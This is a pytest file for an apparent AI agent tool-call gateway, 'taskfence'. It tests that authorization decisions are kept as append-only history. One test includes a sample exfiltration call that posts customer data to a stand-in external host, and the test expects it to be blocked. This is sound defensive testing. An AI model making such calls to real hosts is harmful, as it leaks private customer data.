"""Append-only decision history tests (Phase 2; AD-25, G-01; §3.1.1).

`task_decisions` is append-only from the initial migration: every
authorization decision creates a distinct historical record, the write
surface exposes append and read only, and "latest decision" is derived.
These tests run on SQLite; the PostgreSQL tier
(tests/test_postgres_integration.py) re-checks the same rules on the backend
that carries the concurrency guarantee.
"""

import copy
import json

import pytest
from fastapi.testclient import TestClient

from taskfence import registry
from taskfence.gateway import app

ADMIN = {"X-Admin-Token": "devtoken"}
TASK_TEXT = "Summarize Q3 sales and post it to #sales."


@pytest.fixture()
def client(isolate_gateway, monkeypatch):
    monkeypatch.setenv("TASKFENCE_ADMIN_TOKEN", "devtoken")
    registry.reset_outbox()
    with TestClient(app) as test_client:
        yield test_client, isolate_gateway
    registry.reset_outbox()


def _task(client, text=TASK_TEXT):
    return client.post("/tasks", json={"task_text": text}).json()["task_id"]


def _call(client, task_id, tool, args):
    return client.post(f"/tasks/{task_id}/tool-call",
                       json={"tool": tool, "args": args}).json()


def _rows(db, task_id):
    return db.query(
        "SELECT * FROM task_decisions WHERE task_id = ?"
        " ORDER BY COALESCE(seq, 0), decision_id", (task_id,))


def test_every_decision_appends_a_distinct_record(client):
    client, db = client
    task_id = _task(client)

    first = _call(client, task_id, "read_file",
                  {"asset_id": "sales_report_q3"})
    assert first["decision"]["outcome"] == "ALLOW"

    # Out-of-scope read: the allow-but-taint downgrade is its own record.
    tainted = _call(client, task_id, "query_customer_db", {})
    assert tainted["decision"]["outcome"] == "ALLOW"
    assert tainted["tainted"] is True

    # Outbound gating: the APPROVE decision is another distinct record.
    approved = _call(client, task_id, "send_slack",
                     {"channel": "#sales", "text": "Q3 summary",
                      "source_assets": ["customer_db"]})
    assert approved["decision"]["outcome"] == "APPROVE"

    rows = _rows(db, task_id)
    assert [row["outcome"] for row in rows] == ["ALLOW", "ALLOW", "APPROVE"]
    assert len({row["decision_id"] for row in rows}) == 3
    assert len({row["seq"] for row in rows}) == 3
    assert rows[2]["tool"] == "send_slack"
    assert json.loads(rows[1]["reasons_json"])  # reasons kept verbatim


def test_normal_write_paths_cannot_mutate_earlier_decisions(client):
    """Tool calls, allow_once and a repeated resolution never rewrite
    history: earlier rows stay identical field-for-field."""
    client, db = client
    task_id = _task(client)
    _call(client, task_id, "read_file", {"asset_id": "sales_report_q3"})
    _call(client, task_id, "query_customer_db", {})
    snapshot = copy.deepcopy(_rows(db, task_id))

    approved = _call(client, task_id, "send_slack",
                     {"channel": "#sales", "text": "Q3 summary",
                      "source_assets": ["customer_db"]})
    assert approved["approval_id"]
    resolved = client.post(f"/approvals/{approved['approval_id']}/resolve",
                           json={"choice": "allow_once"},
                           headers=ADMIN).json()
    assert resolved["executed"] is True

    after = _rows(db, task_id)
    assert len(after) == len(snapshot) + 2  # APPROVE + the executed replay
    assert after[:len(snapshot)] == snapshot

    # The third named normal write path — expand_task — also only appends.
    scope_call = _call(client, task_id, "send_slack",
                       {"channel": "#sales", "text": "Q3 summary",
                        "source_assets": ["customer_db"]})
    assert scope_call["approval_id"]
    before_expansion = copy.deepcopy(_rows(db, task_id))
    expanded = client.post(
        f"/approvals/{scope_call['approval_id']}/resolve",
        json={"choice": "expand_task"}, headers=ADMIN).json()
    assert expanded["status"] == "expanded", expanded

    final = _rows(db, task_id)
    assert len(final) == len(before_expansion) + 1  # exactly one new record
    assert final[:len(before_expansion)] == before_expansion
    assert final[-1]["action"] == "approval_resolve"
    assert final[-1]["decision_id"] not in {
        row["decision_id"] for row in before_expansion}


def test_decision_write_surface_is_append_and_read_only():
    from taskfence.persistence import TaskStore
    mutating = [name for name in dir(TaskStore)
                if any(token in name.lower()
                       for token in ("update", "delete", "mutate",
                                     "overwrite", "remove", "edit", "revoke"))]
    assert mutating == []
    assert hasattr(TaskStore, "append_decision")
    assert hasattr(TaskStore, "decisions")
    assert hasattr(TaskStore, "latest_decision")


def test_latest_decision_view_after_restart_matches_the_last_append(client):
    """Restart (fresh stores, same database): the derived latest view is
    the most recently appended decision, in append order."""
    client, db = client
    task_id = _task(client)
    _call(client, task_id, "read_file", {"asset_id": "sales_report_q3"})
    _call(client, task_id, "send_slack",
          {"channel": "#sales", "text": "Q3 summary",
           "source_assets": ["sales_report_q3"], "transformation": "summary"})

    from taskfence.config import Config
    from taskfence.persistence import Persistence
    restarted = Persistence(Config.from_env(
        {"TASKFENCE_DB": str(db.sqlite_path)}))
    history = restarted.tasks.decisions(task_id)
    assert [row["outcome"] for row in history] == ["ALLOW", "ALLOW"]
    latest = restarted.tasks.latest_decision(task_id)
    assert latest["decision_id"] == history[-1]["decision_id"]
    assert latest["outcome"] == "ALLOW"
    assert latest["tool"] == "send_slack"


def test_task_state_is_projection_only(client):
    """No authorization decision relies on `task_state`: wiping or
    corrupting the projection leaves decisions unchanged."""
    client, db = client
    task_id = _task(client)
    first = _call(client, task_id, "read_file",
                  {"asset_id": "sales_report_q3"})
    assert first["decision"]["outcome"] == "ALLOW"

    db.execute("DELETE FROM task_state")
    db.execute("INSERT INTO task_state (task_id, updated_at, state)"
               " VALUES (?, ?, ?)", (task_id, "x", "{ not json"))

    replay = _call(client, task_id, "read_file",
                   {"asset_id": "sales_report_q3"})
    assert replay["decision"]["outcome"] == "ALLOW"
    blocked = _call(client, task_id, "post_external",
                    {"url": "https://collect.example.invalid/ingest",
                     "payload": "customer data",
                     "source_assets": ["customer_db"],
                     "transformation": "export"})
    assert blocked["decision"]["outcome"] == "BLOCK"
    # The decision history still records every decision, in append order:
    assert [row["outcome"]
            for row in _rows(db, task_id)] == ["ALLOW", "ALLOW", "BLOCK"]
